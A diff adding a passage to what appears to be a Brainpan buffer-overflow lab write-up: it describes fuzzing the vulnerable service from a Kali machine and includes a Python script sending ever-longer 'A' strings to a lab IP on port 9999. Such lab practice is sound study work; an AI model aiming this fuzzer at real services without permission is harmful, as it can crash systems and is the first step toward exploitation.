@@ -46,9 +46,42 @@ as you can see service name: `Brainpan` with PID `2108` after attack it run prog
 
 ![Screen Shot 2021-08-26 at 1 49 38 AM](https://user-images.githubusercontent.com/47929033/130879173-18bcdd76-6286-44f6-836a-95ea16152d9a.png)
 
+as you can see programe runing we need now to Discover bufferoverflow vulnerability using fuzzing in my Kali Linux attacking machine I written simple fuzzer using python: 
 
+```
+#!/usr/share/python
+import socket 
+import os
+import time
+ 
+counter = 100
 
+ip = "192.168.1.15"
 
+port = 9999
+
+while (counter<=5012):
+      
+     print("payload sent")
+
+     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+     payload = 'A' * counter
+   
+     s.connect((ip, port))
+
+     s.send(payload + "\r\n")
+     
+     s.recv(1024)
+     
+     s.close()
+     
+     counter+=100
+    
+     print(payload + "\n")
+
+print(len(payload))
+```
 
 
 
